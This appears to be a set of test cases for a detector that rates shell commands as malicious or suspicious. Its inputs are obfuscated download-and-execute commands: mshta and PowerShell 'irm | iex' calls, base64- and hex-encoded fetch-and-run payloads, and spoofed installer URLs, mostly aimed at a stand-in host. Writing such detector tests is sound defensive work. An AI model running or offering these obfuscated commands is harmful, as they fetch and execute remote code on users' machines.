{"id": "command.1b.obf.concat-mshta-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["& ('ms'+'hta') ht", "tps://example.invalid/a.hta"]}, "expect": {"level": "malicious", "reasons_contain": ["mshta 直接執行遠端網址"]}, "tags": ["clickfix", "obfuscation"]}
{"id": "command.1b.obf.concat-mshta-002", "area": "command", "op": "command.analyze", "source": "new", "input": "& ('ms'+'hta') x.hta", "expect": {"level": "malicious", "reasons_contain": ["用混淆手法"]}, "tags": ["obfuscation"], "note": "legacy: None (§3.4 gap); the program name only appears after concatenation"}
{"id": "command.1b.obf.backtick-001", "area": "command", "op": "command.analyze", "source": "new", "input": "p`ow`er`sh`ell -c calc", "expect": {"level": "malicious", "reasons_contain": ["呼叫 PowerShell", "用混淆手法"]}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.base64-ps-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "ex ([Text.Encoding]::UTF8.GetString([Convert]::FromBas", "e64String('aXdyIGh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2E=')))"]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行", "用混淆手法"]}, "tags": ["obfuscation"], "note": "legacy: None (only the weak iex signal)"}
{"id": "command.1b.obf.cmd-substring-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["set x=zzms", "hta&& call %x:~2,5% ht", "tps://example.invalid/a.hta"]}, "expect": {"level": "malicious", "reasons_contain": ["mshta"]}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.cmd-substring-002", "area": "command", "op": "command.analyze", "source": "new", "input": "%ComSpec:~-7,3% /c calc", "expect": {"level": "malicious", "reasons_contain": ["呼叫 cmd", "用混淆手法"]}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.nested-variable-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["set a=ms&& set b=%a%hta&& call %b% ht", "tps://example.invalid/a.hta"]}, "expect": {"level": "malicious"}, "tags": ["obfuscation"], "note": "legacy substitutes one level only"}
{"id": "command.1b.obf.full-width-001", "area": "command", "op": "command.analyze", "source": "new", "input": "ｐｏｗｅｒｓｈｅｌｌ -c calc", "expect": {"level": "malicious", "reasons_contain": ["用混淆手法"]}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.url-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["ms", "hta %68%74%74%70%73://example.invalid/a"]}, "expect": {"level": "malicious"}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.hex-001", "area": "command", "op": "command.analyze", "source": "new", "input": "echo 6375726c2068747470733a2f2f6578616d706c652e696e76616c69642f61207c207368 | xxd -r -p | sh", "expect": {"level": "malicious", "reasons_contain": ["解開後交給 shell"]}, "tags": ["macos", "linux"]}
{"id": "command.1b.obf.python-b64-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pyt", "hon3 -c \"import bas", "e64;exec(bas", "e64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0IGFzIHU7ZXhlYyh1LnVybG9wZW4oJ2h0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2EnKS5yZWFkKCkp'))\""]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["macos", "linux"]}
{"id": "command.1b.obf.format-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["& (\"{1}{0}\" -f 'hta','ms') ht", "tps://example.invalid/a"]}, "expect": {"level": "malicious"}, "tags": ["obfuscation"]}
{"id": "command.1b.obf.official-built-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "rm ('ht", "tps://astral.sh/'+'uv/install.ps1') | i", "ex"]}, "expect": {"level": "malicious", "reasons_contain": ["不是已知的官方安裝網站"]}, "note": "built URLs never qualify for the official list, before or after deobfuscation"}
{"id": "command.1b.obf.official-built-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "rm ([string]::Concat('ht", "tps://astral.sh','.example.invalid/x')) | i", "ex"]}, "expect": {"level": "malicious"}, "note": "§3.4 gap closed: [string]::Concat now counts as built"}
{"id": "command.1b.obf.official-built-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "rm ('ht", "tps://astral.sh/x'.Insert(8,'y')) | i", "ex"]}, "expect": {"level": "malicious"}, "note": "§3.4 gap closed: .Insert() now counts as built"}
{"id": "command.1b.obf.official-built-004", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "rm ht", "tps://astral.sh`.example.invalid/x | i", "ex"]}, "expect": {"level": "malicious"}, "note": "a backtick inside a URL is a PowerShell escape, not markdown"}
{"id": "command.1b.obf.official-built-005", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["i", "rm ht", "tps://astral.sh%2E%65%76il.example.invalid/x | i", "ex"]}, "expect": {"level": "malicious"}}
{"id": "command.1b.obf.ps-variable-official-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["$u = 'ht", "tps://astral.sh/uv/install.ps1'; i", "rm $u | i", "ex"]}, "expect": {"level": "suspicious"}, "tags": ["installer"], "note": "plain variables are not built strings (legacy behavior kept)"}
